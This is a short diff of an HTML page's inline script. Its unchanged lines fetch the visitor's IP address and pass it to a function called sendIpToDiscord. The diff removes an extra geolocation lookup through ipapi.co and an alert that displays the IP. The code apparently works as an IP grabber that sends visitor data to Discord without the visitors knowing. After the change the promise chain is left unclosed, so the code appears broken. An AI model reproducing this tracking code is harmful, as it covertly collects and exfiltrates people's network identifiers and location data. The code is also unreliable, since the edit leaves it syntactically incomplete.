@@ -38,21 +38,6 @@
             .then(data => {
                 console.log('Your IP address is: ' + data.ip);
                 sendIpToDiscord(data.ip);
-            })
-            .catch(error => console.error('Error:', error));
-            fetch('https://ipapi.co/json/')
-          .then(response => response.json())
-          .then(data => {
-            console.log('IP Address:', data.ip);
-            console.log('City:', data.city);
-            console.log('Country:', data.country_name);
-            // Further process the location data
-          })
-          .catch(error => {
-            console.error('Error fetching IP location:', error);
-          });
-
-    window.alert(data.ip);
     </script>
 </body>
 </html>
